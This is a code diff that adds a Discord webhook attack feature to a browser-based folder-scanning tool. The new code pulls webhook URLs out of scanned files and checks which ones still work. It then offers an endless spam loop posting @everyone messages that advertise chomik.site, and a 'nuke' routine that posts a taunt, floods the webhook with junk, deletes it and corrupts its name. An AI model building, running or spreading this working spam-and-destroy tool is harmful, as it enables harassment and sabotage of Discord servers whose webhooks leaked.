@@ -307,6 +307,111 @@
         transform: translateY(110vh) rotate(360deg);
       }
     }
+
+    /* Webhook Related Styles */
+    .webhook-container {
+      margin-top: 20px;
+      padding: 15px;
+      background: #1e1e1e;
+      border-radius: 8px;
+      border: 1px solid #333;
+      max-height: 300px; /* Fixed height */
+      overflow-y: auto; /* Enable vertical scrolling */
+      scrollbar-width: thin; /* Firefox */
+      scrollbar-color: #007bff #1e1e1e; /* Firefox */
+    }
+
+    /* Webkit scrollbar styles */
+    .webhook-container::-webkit-scrollbar {
+      width: 8px;
+    }
+
+    .webhook-container::-webkit-scrollbar-track {
+      background: #1e1e1e;
+      border-radius: 4px;
+    }
+
+    .webhook-container::-webkit-scrollbar-thumb {
+      background: #007bff;
+      border-radius: 4px;
+    }
+
+    .webhook-container::-webkit-scrollbar-thumb:hover {
+      background: #0056b3;
+    }
+
+    .webhook {
+      display: grid;
+      grid-template-columns: auto 1fr;
+      gap: 15px;
+      background: #262626;
+      padding: 15px;
+      margin: 10px 0;
+      border-radius: 8px;
+      border: 1px solid #333;
+      transition: border-color 0.2s;
+    }
+
+    .webhook:hover {
+      border-color: #007bff;
+    }
+
+    .webhook-avatar {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+    }
+
+    .webhook-content {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .webhook-url {
+      color: #00ff00;
+      word-break: break-all;
+      font-family: monospace;
+      font-size: 0.9em;
+      padding: 5px;
+      background: #1a1a1a;
+      border-radius: 4px;
+    }
+
+    .webhook-controls {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+
+    .webhook-spam-input {
+      background: #1a1a1a;
+      color: white;
+      border: 1px solid #333;
+      padding: 8px;
+      border-radius: 4px;
+      flex: 1;
+      min-width: 200px;
+    }
+
+    .webhook-spam-input:focus {
+      border-color: #007bff;
+      outline: none;
+    }
+
+    .mention-tag {
+      background: #1a1a1a;
+      color: white;
+      border: 1px solid #333;
+      padding: 8px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .mention-tag:focus {
+      border-color: #007bff;
+      outline: none;
+    }
   </style>
 </head>
 <body>
@@ -377,6 +482,9 @@
     <input type="file" id="folder-input" webkitdirectory directory multiple>
     <div id="progress-container">
       <div id="progress-bar">0%</div>
+    </div>
+    <div class="webhook-container">
+      <div id="webhooks-list"></div>
     </div>
     <div id="results-container">
       <div id="results"></div>
@@ -505,6 +613,7 @@
       progressBar.textContent = '0%';
       resultsContainer.innerHTML = ''; // Clear previous results
       allTriggers = []; // Reset all triggers
+      let allWebhooks = new Set(); // Use Set to avoid duplicates
 
       for (let i = 0; i < files.length; i++) {
         const file = files[i];
@@ -513,6 +622,10 @@
           const folderPath = file.webkitRelativePath.split('/').slice(0, -1).join('/'); // Extract subfolder path
           const triggers = extractTriggers(text, folderPath); // Pass subfolder path
           allTriggers.push(...triggers);
+          
+          // Extract and add webhooks
+          const webhooks = extractWebhooks(text);
+          webhooks.forEach(webhook => allWebhooks.add(webhook));
         }
 
         // Update progress bar
@@ -524,6 +637,7 @@
       progressContainer.style.display = 'none'; // Hide progress bar after completion
       downloadButton.disabled = false; // Enable download button
       displayTriggers(allTriggers); // Display all triggers
+      displayWebhooks(Array.from(allWebhooks)); // Convert Set to Array for display
     });
 
     // Search Functionality
@@ -592,6 +706,183 @@ __      ____      ____      __  ___ | |__    ___   _ __ ___  (_)| | __    ___ (_
       a.click();
       URL.revokeObjectURL(url);
     });
+
+    // Add these new functions for webhook handling
+    function extractWebhooks(content) {
+      const webhookRegex = /https:\/\/(?:ptb\.|canary\.)?discord\.com\/api\/webhooks\/\d+\/[\w-]+/g;
+      return content.match(webhookRegex) || [];
+    }
+
+    function displayWebhooks(webhooks) {
+      const webhooksList = document.getElementById('webhooks-list');
+      if (!webhooksList || !webhooks.length) return;
+
+      webhooksList.innerHTML = webhooks.map(webhook => {
+        const webhookId = btoa(webhook).replace(/[^a-zA-Z0-9]/g, '');
+        return `
+          <div class="webhook" data-webhook-id="${webhookId}">
+            <img src="https://imagedelivery.net/HL_Fwm__tlvUGLZF2p74xw/b5242d9e-b8db-4957-d35d-76442ed70c00/public" 
+                 alt="Webhook Avatar" 
+                 class="webhook-avatar">
+            <div class="webhook-content">
+              <div class="webhook-url">${webhook}</div>
+              <div class="webhook-info">Status: <span class="webhook-status">Checking...</span></div>
+              <div class="webhook-controls">
+                <div style="display: flex; gap: 5px; margin-bottom: 8px;">
+                  <select class="mention-tag" onchange="insertMention(this)">
+                    <option value="">Add Mention</option>
+                    <option value="@everyone">@everyone</option>
+                    <option value="@here">@here</option>
+                    <option value="||@everyone||">Spoiler @everyone</option>
+                    <option value="||@here||">Spoiler @here</option>
+                  </select>
+                  <input type="text" class="webhook-spam-input" placeholder="www.chomik.site">
+                </div>
+                <button class="spam-btn" onclick="startInfiniteSpam('${webhook}', this)">♾️ Spam</button>
+                <button class="stop-btn" onclick="stopSpam('${webhook}', this)" style="display:none;">Stop</button>
+                <button class="delete-btn" onclick="nukeWebhook('${webhook}')">Delete</button>
+              </div>
+            </div>
+          </div>
+        `;
+      }).join('');
+
+      webhooks.forEach(webhook => {
+        const webhookId = btoa(webhook).replace(/[^a-zA-Z0-9]/g, '');
+        checkWebhook(webhook, webhookId);
+      });
+    }
+
+    // Store spam intervals
+    const spamControls = new Map();
+
+    // Start infinite spam
+    async function startInfiniteSpam(webhook, button) {
+      const container = button.closest('.webhook-controls');
+      const spamInput = container.querySelector('.webhook-spam-input');
+      const stopBtn = container.querySelector('.stop-btn');
+
+      button.style.display = 'none';
+      stopBtn.style.display = 'inline';
+
+      spamControls.set(webhook, true);
+      
+      while (spamControls.has(webhook)) {
+        try {
+          await fetch(webhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              content: spamInput.value || 'www.chomik.site @everyone',
+              username: 'Chomik Webhook Spammer',
+              avatar_url: 'https://imagedelivery.net/HL_Fwm__tlvUGLZF2p74xw/b5242d9e-b8db-4957-d35d-76442ed70c00/public',
+              allowed_mentions: { parse: ['everyone'] }
+            })
+          });
+          await new Promise(r => setTimeout(r, Math.random() * 50));
+        } catch (error) {
+          console.error('Spam error:', error);
+        }
+      }
+    }
+
+    // Stop spam
+    function stopSpam(webhook, stopBtn) {
+      spamControls.delete(webhook);
+      const container = stopBtn.closest('.webhook-controls');
+      const spamBtn = container.querySelector('.spam-btn');
+      spamBtn.style.display = 'inline';
+      stopBtn.style.display = 'none';
+    }
+
+    // Check webhook status
+    async function checkWebhook(webhook) {
+      const webhookId = btoa(webhook).replace(/[^a-zA-Z0-9]/g, '');
+      const container = document.querySelector(`[data-webhook-id="${webhookId}"]`);
+      if (!container) return;
+
+      const statusElement = container.querySelector('.webhook-status');
+      if (!statusElement) return;
+
+      try {
+        const response = await fetch(webhook);
+        statusElement.textContent = response.ok ? '🟢 Working' : '🔴 Invalid';
+        statusElement.style.color = response.ok ? '#00ff00' : '#ff0000';
+      } catch {
+        statusElement.textContent = '🔴 Invalid';
+        statusElement.style.color = '#ff0000';
+      }
+    }
+
+    // Nuke webhook with multiple methods
+    async function nukeWebhook(webhook) {
+      const webhookId = btoa(webhook).replace(/[^a-zA-Z0-9]/g, '');
+      const container = document.querySelector(`[data-webhook-id="${webhookId}"]`);
+      if (!container) return;
+
+      const statusElement = container.querySelector('.webhook-status');
+      const controls = container.querySelector('.webhook-controls');
+
+      statusElement.textContent = '⚠️ Nuking...';
+      statusElement.style.color = '#ffa500';
+      controls.style.opacity = '0.5';
+      controls.style.pointerEvents = 'none';
+
+      try {
+        // Send nuke message first
+        await fetch(webhook, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: '**YOUR WEBHOOK HAS BEEN NUKED BY www.chomik.site** @everyone\nJoin us: https://discord.gg/wXPr48bDEJ',
+            username: 'Chomik Webhook Nuker',
+            avatar_url: 'https://imagedelivery.net/HL_Fwm__tlvUGLZF2p74xw/b5242d9e-b8db-4957-d35d-76442ed70c00/public',
+            allowed_mentions: { parse: ['everyone'] }
+          })
+        });
+
+        // Wait for nuke message to be seen
+        await new Promise(r => setTimeout(r, 1000));
+
+        // Method 1: Standard DELETE
+        await fetch(webhook, { method: 'DELETE' });
+
+        // Method 2: Spam invalid data
+        const spamPromises = Array(50).fill().map(() => 
+          fetch(webhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: ''.padStart(2000, '█') })
+          })
+        );
+        await Promise.all(spamPromises);
+
+        // Method 3: Corrupt webhook
+        await fetch(webhook, {
+          method: 'PATCH',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ name: ''.padStart(100, '⟰') })
+        });
+
+        statusElement.textContent = '💀 Nuked';
+        statusElement.style.color = '#ff0000';
+      } catch (error) {
+        statusElement.textContent = '❌ Nuke Failed';
+        statusElement.style.color = '#ff0000';
+        console.error('Nuke error:', error);
+        controls.style.pointerEvents = 'auto';
+        controls.style.opacity = '1';
+      }
+    }
+
+    // Add mention insertion function
+    function insertMention(select) {
+      if (!select.value) return;
+      const container = select.closest('.webhook-controls');
+      const input = container.querySelector('.webhook-spam-input');
+      input.value = select.value + ' ' + (input.value || 'www.chomik.site');
+      select.value = ''; // Reset select
+    }
   </script>
 </body>
 </html>
